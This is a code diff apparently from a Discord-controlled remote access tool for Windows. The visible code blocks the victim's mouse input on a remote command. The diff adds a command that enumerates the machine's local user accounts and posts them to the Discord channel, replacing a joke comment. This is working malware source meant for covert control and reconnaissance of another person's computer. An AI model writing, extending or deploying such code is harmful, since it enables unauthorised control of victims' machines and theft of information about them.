@@ -1,4 +1,4 @@
-import random,string,subprocess,os,discord,shutil,winreg,io, asyncio, sys, ctypes, threading
+import random,string,subprocess,os,discord,shutil,winreg,io, asyncio, sys, ctypes, threading, win32net, psutil
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from ctypes import cast, POINTER
 from comtypes import CLSCTX_ALL
@@ -108,4 +108,5 @@ async def nomouse_command(ctx, action: str):
    ctypes.windll.user32.BlockInput(False)
    await ctx.send("Mouse input is now unblocked.")
   else: await ctx.send("Mouse input is not currently blocked.")                       
-#if ur seeing this ur a W
+async def listusers(ctx):
+    await ctx.send(embed=discord.Embed(title="System Users", description="\n".join([user['name'] for user in win32net.NetUserEnum(None, 0)[0]]) or "No users found", color=discord.Color.blue()))
